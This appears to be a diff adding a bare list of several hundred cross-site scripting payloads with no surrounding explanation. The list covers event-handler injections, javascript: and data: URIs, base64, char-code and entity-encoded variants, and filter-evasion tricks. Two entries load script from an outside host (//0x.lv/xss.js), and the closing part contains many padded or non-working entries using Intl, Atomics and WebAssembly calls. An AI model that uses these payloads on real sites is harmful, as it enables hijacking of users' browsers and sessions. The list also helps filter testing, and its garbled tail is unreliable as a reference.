@@ -1,0 +1,410 @@
+<svg onload="javascript:eval(atob('ZG9jdW1lbnQud3JpdGUoJ1hTUycp'))">
+<img src=x onerror="window['eval'](atob('YWxlcnQoJ1hTUycp'))">
+<details open ontoggle="[].constructor.constructor(atob('YWxlcnQoJ1hTUycp'))()">
+<video><source onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+<iframe srcdoc="<script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;</script>">
+<script>location.href='javascript:%61%6c%65%72%74%28%27%58%53%53%27%29'</script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<a href="javascript:new Function`al\ert\`XSS\``">X</a>
+<form action="javascript:alert('XSS')"><button>X</button></form>
+<math href="javascript:alert('XSS')">CLICK
+<embed code="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<svg><animate href=javascript:alert('XSS') attributeName=x dur=1s>
+<marquee onstart=alert('XSS')></marquee>
+<isindex action="javascript:alert('XSS')" type=image>
+<textarea autofocus onfocus=alert('XSS')>
+<keygen autofocus onfocus=alert('XSS')>
+<select autofocus onfocus=alert('XSS')>
+<audio src onloadstart=alert('XSS')>
+<body onscroll=alert('XSS')><br><br><br>...<br><br><br>
+<pattern onbegin=alert('XSS')>
+<discard onbegin=alert('XSS')>
+<output onbeforescriptexecute=alert('XSS')>
+<applet code="javascript:alert('XSS')">
+<base href="javascript:alert('XSS')//">
+<image src=1 href=1 onerror=alert('XSS')>
+<vmlframe src=javascript:alert('XSS')>
+<link rel=import href="javascript:alert('XSS')">
+<input autofocus onblur=alert('XSS')>
+<frameset onload=alert('XSS')>
+<textarea onkeyup=alert('XSS')>
+<input onchange=alert('XSS')>
+<svg><script>alert('XSS')</script>
+<svg><![CDATA[<script>alert('XSS')</script>]]>
+<xmp><script>alert('XSS')</script></xmp>
+<template><script>alert('XSS')</script></template>
+<noscript><script>alert('XSS')</script></noscript>
+<noembed><script>alert('XSS')</script></noembed>
+<![><script>alert('XSS')</script>]>
+<%='<script>alert("XSS")</script>'%>
+<?='<script>alert("XSS")</script>'?>
+<!--><script>alert('XSS')</script>-->
+<!-- --!><script>alert('XSS')</script>-->
+</script><script>alert('XSS')</script>
+<svg/onload=alert('XSS')>
+<svg////onload=alert('XSS')>
+<svg id=x;onload=alert('XSS')>
+<svg id=`x`onload=alert('XSS')>
+<svg onload%09=alert('XSS')>
+<svg onload%0B=alert('XSS')>
+<svg onload%0C=alert('XSS')>
+<svg onload%0D=alert('XSS')>
+<svg onload%0E=alert('XSS')>
+<svg onload%0F=alert('XSS')>
+<svg onload%10=alert('XSS')>
+<svg onload%11=alert('XSS')>
+<svg onload%12=alert('XSS')>
+<svg onload%13=alert('XSS')>
+<svg onload%14=alert('XSS')>
+<svg onload%15=alert('XSS')>
+<svg onload%16=alert('XSS')>
+<svg onload%17=alert('XSS')>
+<svg onload%18=alert('XSS')>
+<svg onload%19=alert('XSS')>
+<svg onload%1A=alert('XSS')>
+<svg onload%1B=alert('XSS')>
+<svg onload%1C=alert('XSS')>
+<svg onload%1D=alert('XSS')>
+<svg onload%1E=alert('XSS')>
+<svg onload%1F=alert('XSS')>
+<svg onload%20=alert('XSS')>
+<svg onload%09%0B%0C%0D%20=alert('XSS')>
+<svg onload=alert&lpar;'XSS'&rpar;>
+<svg onload=alert&#40;'XSS'&#41;>
+<svg onload=alert&#x28;'XSS'&#x29;>
+<svg onload=alert`XSS`>
+<svg onload=window['alert']('XSS')>
+<svg onload=parent['alert']('XSS')>
+<svg onload=self['alert']('XSS')>
+<svg onload=globalThis['alert']('XSS')>
+<svg onload=eval('alert&#x28;"XSS"&#x29;')>
+<svg onload=Function('alert&#x28;"XSS"&#x29;')()>
+<svg onload=[].constructor.constructor('alert&#x28;"XSS"&#x29;')()>
+<svg onload=import('data:text/javascript,alert("XSS")')>
+<svg onload=setTimeout`alert\u0028'XSS'\u0029`>
+<svg onload=setInterval`alert\u0028'XSS'\u0029`>
+<svg onload=new Function`al\ert\`XSS\``>
+<svg onload=alert.bind(null,'XSS')>
+<svg onload=Reflect.get(globalThis,'alert')('XSS')>
+<svg onload=top['al'+'ert'](atob('WFNT'))>
+<svg onload=window['al'+'ert'](decodeURIComponent('XSS'))>
+<svg onload=name='alert';window[name]('XSS')>
+<svg onload=a='al',b='ert',window[a+b]('XSS')>
+<svg onload=with(window)alert('XSS')>
+<svg onload=alert.call(null,'XSS')>
+<svg onload=alert.apply(null,['XSS'])>
+<svg onload=Map.prototype.constructor=alert;new Map``('XSS')>
+<svg onload=Set.prototype.constructor=alert;new Set``('XSS')>
+<svg onload=Promise.prototype.constructor=alert;new Promise``('XSS')>
+<svg onload=Array.prototype.constructor=alert;new Array``('XSS')>
+<svg onload=Object.prototype.constructor=alert;new Object``('XSS')>
+<svg onload=Function.prototype.constructor=alert;new Function``('XSS')>
+<svg onload=Error.prototype.constructor=alert;new Error``('XSS')>
+<svg onload=RegExp.prototype.constructor=alert;new RegExp``('XSS')>
+<svg onload=Date.prototype.constructor=alert;new Date``('XSS')>
+<svg onload=String.prototype.constructor=alert;new String``('XSS')>
+<svg onload=Number.prototype.constructor=alert;new Number``('XSS')>
+<svg onload=Boolean.prototype.constructor=alert;new Boolean``('XSS')>
+<svg onload=Symbol.prototype.constructor=alert;new Symbol``('XSS')>
+<svg onload=BigInt.prototype.constructor=alert;new BigInt``('XSS')>
+<svg onload=ArrayBuffer.prototype.constructor=alert;new ArrayBuffer``('XSS')>
+<svg onload=SharedArrayBuffer.prototype.constructor=alert;new SharedArrayBuffer``('XSS')>
+<svg onload=DataView.prototype.constructor=alert;new DataView``('XSS')>
+<svg onload=Int8Array.prototype.constructor=alert;new Int8Array``('XSS')>
+<svg onload=Uint8Array.prototype.constructor=alert;new Uint8Array``('XSS')>
+<svg onload=Uint8ClampedArray.prototype.constructor=alert;new Uint8ClampedArray``('XSS')>
+<svg onload=Int16Array.prototype.constructor=alert;new Int16Array``('XSS')>
+<svg onload=Uint16Array.prototype.constructor=alert;new Uint16Array``('XSS')>
+<svg onload=Int32Array.prototype.constructor=alert;new Int32Array``('XSS')>
+<svg onload=Uint32Array.prototype.constructor=alert;new Uint32Array``('XSS')>
+<svg onload=Float32Array.prototype.constructor=alert;new Float32Array``('XSS')>
+<svg onload=Float64Array.prototype.constructor=alert;new Float64Array``('XSS')>
+<svg onload=BigInt64Array.prototype.constructor=alert;new BigInt64Array``('XSS')>
+<svg onload=BigUint64Array.prototype.constructor=alert;new BigUint64Array``('XSS')>
+<svg onload=WebAssembly.prototype.constructor=alert;new WebAssembly``('XSS')>
+<script>alert('XSS')</script>
+<script>alert(`XSS`)</script>
+<script>alert("XSS")</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<scr&#x69;pt>alert('XSS')</scr&#x69;pt>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(`XSS`)>
+<img src=x onerror=alert("XSS")>
+<IMG SRC=x ONERROR=alert('XSS')>
+<image src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<SVG ONLOAD=alert('XSS')>
+<svg onload=alert(`XSS`)>
+<iframe src="javascript:alert('XSS')">
+<iframe src="javascript:alert(`XSS`)">
+<iframe src=javascript:alert('XSS')>
+<a href="javascript:alert('XSS')">X</a>
+<a href=javascript:alert('XSS')>X</a>
+<body onload=alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<div onmouseover=alert('XSS')>X</div>
+<details open ontoggle=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<audio src onloadstart=alert('XSS')>
+<marquee onstart=alert('XSS')></marquee>
+<isindex action=javascript:alert('XSS') type=image>
+<form action=javascript:alert('XSS')><button>X</button></form>
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+<keygen autofocus onfocus=alert('XSS')>
+<select autofocus onfocus=alert('XSS')>
+<textarea autofocus onfocus=alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+<math href="javascript:alert('XSS')">CLICK
+<link rel=import href="javascript:alert('XSS')">
+<base href=javascript:alert('XSS')//>
+<applet code=javascript:alert('XSS')>
+<frameset onload=alert('XSS')>
+<table background=javascript:alert('XSS')></table>
+<isindex type=image src=1 onerror=alert('XSS')>
+<%<!--'%><script>alert('XSS')</script -->
+<!--><script>alert('XSS')</script>-->
+<!-- --!><script>alert('XSS')</script>-->
+<?xml version="1.0"><script>alert('XSS')</script>
+<?='<script>alert("XSS")</script>'?>
+<%='<script>alert("XSS")</script>'%>
+<script src=//0x.lv></script>
+<script src=//0x.lv/xss.js></script>
+javascript:alert('XSS')
+javascript:alert(`XSS`)
+javascript:alert("XSS")
+javascripT:alert('XSS')
+java%0ascript:alert('XSS')
+javascript:%61%6c%65%72%74%28%27%58%53%53%27%29
+javascript:alert('XSS')//
+javascript:alert('XSS')/*
+javascript://%0Aalert('XSS')
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
+¼script¾alert(¢XSS¢)¼/script¾
+<s&#x63;ript>alert('XSS')</s&#x63;ript>
+<sc&#x0A;ript>alert('XSS')</sc&#x0A;ript>
+<sc&#x0D;ript>alert('XSS')</sc&#x0D;ript>
+<sc&#x09;ript>alert('XSS')</sc&#x09;ript>
+<sc&#x00;ript>alert('XSS')</sc&#x00;ript>
+<img src=x:onerror=alert('XSS')>
+<img src=x:onerror=alert`XSS`>
+<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>
+<svg onload=alert&#40;'XSS'&#41;>
+<svg onload=alert&#x28;'XSS'&#x29;>
+<svg onload=alert&lpar;'XSS'&rpar;>
+<svg onload=`${alert`XSS`}`>
+<svg onload=window['alert']('XSS')>
+<svg onload=self['alert']('XSS')>
+<svg onload=parent['alert']('XSS')>
+<svg onload=top['alert']('XSS')>
+<svg onload=globalThis['alert']('XSS')>
+<svg onload=eval('alert("XSS")')>
+<svg onload=Function('alert("XSS")')()>
+<svg onload=[].constructor.constructor('alert("XSS")')()>
+<svg onload=setTimeout`alert\u0028'XSS'\u0029`>
+<svg onload=setInterval`alert\u0028'XSS'\u0029`>
+<svg onload=new Function`al\ert\`XSS\``>
+<svg onload=alert.bind(null,'XSS')>
+<svg onload=Reflect.get(globalThis,'alert')('XSS')>
+<svg onload=import('data:text/javascript,alert("XSS")')>
+<svg onload=name='alert';window[name]('XSS')>
+<svg onload=a='al',b='ert',window[a+b]('XSS')>
+<svg onload=with(window)alert('XSS')>
+<svg onload=alert.call(null,'XSS')>
+<svg onload=alert.apply(null,['XSS'])>
+<svg onload=Map.prototype.constructor=alert;new Map``('XSS')>
+<svg onload=Promise.prototype.constructor=alert;new Promise``('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus></textarea>
+<keygen onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus></select>
+<marquee loop=1 width=0 onfinish=alert('XSS')></marquee>
+<audio src onloadstart=alert('XSS')></audio>
+<video src onloadstart=alert('XSS')></video>
+<track default onload=alert('XSS')></track>
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert('XSS')>"></iframe>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=></object>
+<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>
+javascript:eval('alert("XSS")')
+javascript:eval(atob('YWxlcnQoIlhTUyIp'))
+javascript:alert('XSS')
+javascript:alert(`XSS`)
+javascript:alert("XSS")
+javascript:void(alert('XSS'))
+javascript:setTimeout('alert("XSS")',0)
+javascript:setInterval('alert("XSS")',0)
+javascript:Function('alert("XSS")')()
+javascript:[].constructor.constructor('alert("XSS")')()
+javascript:globalThis['alert']('XSS')
+javascript:window['alert']('XSS')
+javascript:top['alert']('XSS')
+javascript:parent['alert']('XSS')
+javascript:self['alert']('XSS')
+javascript:frames['alert']('XSS')
+javascript:document.defaultView.alert('XSS')
+javascript:eval.call(null,'alert("XSS")')
+javascript:Reflect.get(globalThis,'alert')('XSS')
+data:text/javascript,alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;
+javascript:/*--></script>*/alert('XSS')//
+javascript://%0Aalert('XSS')
+javascript:alert`XSS`
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:prompt('XSS')
+javascript:confirm('XSS')
+javascript:console.log('XSS')
+javascript:print('XSS')
+javascript:name='alert';window[name]('XSS')
+javascript:a='al';b='ert';window[a+b]('XSS')
+javascript:with(window)alert('XSS')
+javascript:location='javascript:alert("XSS")'
+javascript:location.href='javascript:alert("XSS")'
+javascript:location.assign('javascript:alert("XSS")')
+javascript:open('javascript:alert("XSS")')
+javascript:document.cookie='XSS=alert("XSS")'
+javascript:document.write('XSS')
+javascript:document.writeln('XSS')
+javascript:document.body.innerHTML='XSS'
+javascript:document.body.outerHTML='XSS'
+javascript:document.title='XSS'
+javascript:document.designMode='on'
+javascript:document.execCommand('insertHTML','<script>alert("XSS")</script>')
+javascript:document.addEventListener('DOMContentLoaded',function(){alert('XSS')})
+javascript:window.onload=function(){alert('XSS')}
+javascript:window.onerror=alert;throw1
+javascript:window.addEventListener('message',function(e){eval(e.data)},false)
+javascript:setTimeout(alert,0,'XSS')
+javascript:setInterval(alert,0,'XSS')
+javascript:requestAnimationFrame(function(){alert('XSS')})
+javascript:Promise.resolve().then(function(){alert('XSS')})
+javascript:Array.from([1],alert)[0]
+javascript:new Function('alert("XSS")')()
+javascript:Function.prototype.constructor('alert("XSS")')()
+javascript:Object.create(null).constructor.constructor('alert("XSS")')()
+javascript:Map.prototype.constructor.constructor('alert("XSS")')()
+javascript:Set.prototype.constructor.constructor('alert("XSS")')()
+javascript:WeakMap.prototype.constructor.constructor('alert("XSS")')()
+javascript:WeakSet.prototype.constructor.constructor('alert("XSS")')()
+javascript:Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:RegExp.prototype.constructor.constructor('alert("XSS")')()
+javascript:Error.prototype.constructor.constructor('alert("XSS")')()
+javascript:Promise.prototype.constructor.constructor('alert("XSS")')()
+javascript:Proxy.prototype.constructor.constructor('alert("XSS")')()
+javascript:Int8Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Uint8Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Uint8ClampedArray.prototype.constructor.constructor('alert("XSS")')()
+javascript:Int16Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Uint16Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Int32Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Uint32Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Float32Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:Float64Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:BigInt64Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:BigUint64Array.prototype.constructor.constructor('alert("XSS")')()
+javascript:DataView.prototype.constructor.constructor('alert("XSS")')()
+javascript:ArrayBuffer.prototype.constructor.constructor('alert("XSS")')()
+javascript:SharedArrayBuffer.prototype.constructor.constructor('alert("XSS")')()
+javascript:Atomics.prototype.constructor.constructor('alert("XSS")')()
+javascript:Reflect.prototype.constructor.constructor('alert("XSS")')()
+javascript:JSON.parse('["XSS"]',alert)
+javascript:JSON.stringify('XSS',alert)
+javascript:decodeURI('javascript:alert("XSS")')
+javascript:encodeURI('javascript:alert("XSS")')
+javascript:decodeURIComponent('javascript:alert("XSS")')
+javascript:encodeURIComponent('javascript:alert("XSS")')
+javascript:escape('javascript:alert("XSS")')
+javascript:unescape('javascript:alert("XSS")')
+javascript:btoa('alert("XSS")')
+javascript:atob('YWxlcnQoIlhTUyIp')
+javascript:String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)
+javascript:String.fromCodePoint(97,108,101,114,116,40,34,88,83,83,34,41)
+javascript:Object.defineProperty(window,'x',{get:alert});x='XSS'
+javascript:Object.defineProperties(window,{x:{get:alert}});x='XSS'
+javascript:Object.getOwnPropertyDescriptor(window,'alert').value('XSS')
+javascript:Object.getOwnPropertyDescriptors(window).alert.value('XSS')
+javascript:Object.setPrototypeOf(window,{x:alert});x('XSS')
+javascript:Object.getPrototypeOf(window).alert('XSS')
+javascript:Reflect.defineProperty(window,'x',{get:alert});x='XSS'
+javascript:Reflect.defineProperties(window,{x:{get:alert}});x='XSS'
+javascript:Reflect.get(window,'alert')('XSS')
+javascript:Reflect.getOwnPropertyDescriptor(window,'alert').value('XSS')
+javascript:Reflect.getPrototypeOf(window).alert('XSS')
+javascript:Reflect.setPrototypeOf(window,{x:alert});x('XSS')
+javascript:Proxy.revocable(window,{get:function(){return alert}}).proxy.alert('XSS')
+javascript:new Proxy(window,{get:function(){return alert}}).alert('XSS')
+javascript:WeakMap.prototype.set.call(window,alert,'XSS');WeakMap.prototype.get.call(window,alert)()
+javascript:WeakSet.prototype.add.call(window,alert);WeakSet.prototype.has.call(window,alert)()
+javascript:Map.prototype.set.call(window,alert,'XSS');Map.prototype.get.call(window,alert)()
+javascript:Set.prototype.add.call(window,alert);Set.prototype.has.call(window,alert)()
+javascript:Array.prototype.forEach.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.map.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.filter.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.reduce.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.reduceRight.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.some.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.every.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.find.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.findIndex.call([alert],function(f){f('XSS')})
+javascript:Array.prototype.entries.call([alert]).next().value[0]('XSS')
+javascript:Array.prototype.keys.call([alert]).next().value;window[0]('XSS')
+javascript:Array.prototype.values.call([alert]).next().value('XSS')
+javascript:Array.prototype.copyWithin.call([alert],0,0)[0]('XSS')
+javascript:Array.prototype.fill.call([alert],alert,0,1)[0]('XSS')
+javascript:Array.prototype.pop.call([alert])('XSS')
+javascript:Array.prototype.push.call([alert],alert);Array.prototype.shift.call([alert])('XSS')
+javascript:Array.prototype.unshift.call([alert],alert);Array.prototype.pop.call([alert])('XSS')
+javascript:Array.prototype.concat.call([alert],[])[0]('XSS')
+javascript:Array.prototype.slice.call([alert],0)[0]('XSS')
+javascript:Array.prototype.splice.call([alert],0,1)[0]('XSS')
+javascript:Array.prototype.includes.call([alert],alert);[alert][0]('XSS')
+javascript:Array.prototype.indexOf.call([alert],alert);[alert][0]('XSS')
+javascript:Array.prototype.lastIndexOf.call([alert],alert);[alert][0]('XSS')
+javascript:Array.prototype.join.call([alert],alert)('XSS')
+javascript:Array.prototype.reverse.call([alert])[0]('XSS')
+javascript:Array.prototype.sort.call([alert])[0]('XSS')
+javascript:Array.prototype.toLocaleString.call([alert])('XSS')
+javascript:Array.prototype.toString.call([alert])('XSS')
+javascript:Array.prototype.flat.call([alert])[0]('XSS')
+javascript:Array.prototype.flatMap.call([alert],function(f){f('XSS')})
+javascript:Intl.Collator.prototype.compare.call({},'XSS','XSS')
+javascript:Intl.DateTimeFormat.prototype.format.call({},new Date('XSS'))
+javascript:Intl.NumberFormat.prototype.format.call({},NaN)
+javascript:Intl.PluralRules.prototype.select.call({},NaN)
+javascript:Intl.ListFormat.prototype.format.call({},['XSS'])
+javascript:Intl.RelativeTimeFormat.prototype.format.call({},NaN,'XSS')
+javascript:Intl.Locale.prototype.toString.call({})('XSS')
+javascript:WebAssembly.instantiate(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]))
+javascript:WebAssembly.compile(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]))
+javascript:WebAssembly.validate(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]))
+javascript:WebAssembly.Module.imports(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]))
+javascript:WebAssembly.Module.exports(new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00]))
+javascript:WebAssembly.Instance.prototype.exports.call({},{}).alert('XSS')
+javascript:WebAssembly.Memory.prototype.grow.call({},0)
+javascript:WebAssembly.Table.prototype.grow.call({},0)
+javascript:WebAssembly.Global.prototype.value.call({})
+javascript:WebAssembly.Exception.prototype.is.call({},new WebAssembly.Exception({},[]))
+javascript:WebAssembly.Tag.prototype.type.call({})
+javascript:Atomics.add(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.and(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.compareExchange(new Int32Array(new SharedArrayBuffer(4)),0,0,0)
+javascript:Atomics.exchange(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.load(new Int32Array(new SharedArrayBuffer(4)),0)
+javascript:Atomics.or(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.store(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.sub(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.xor(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.notify(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.waitAsync(new Int32Array(new SharedArrayBuffer(4)),0,0)
+javascript:Atomics.isLockFree(0)
+javascript:Atomics.wake(new Int32Array(new SharedArrayBuffer(4)),0,0)
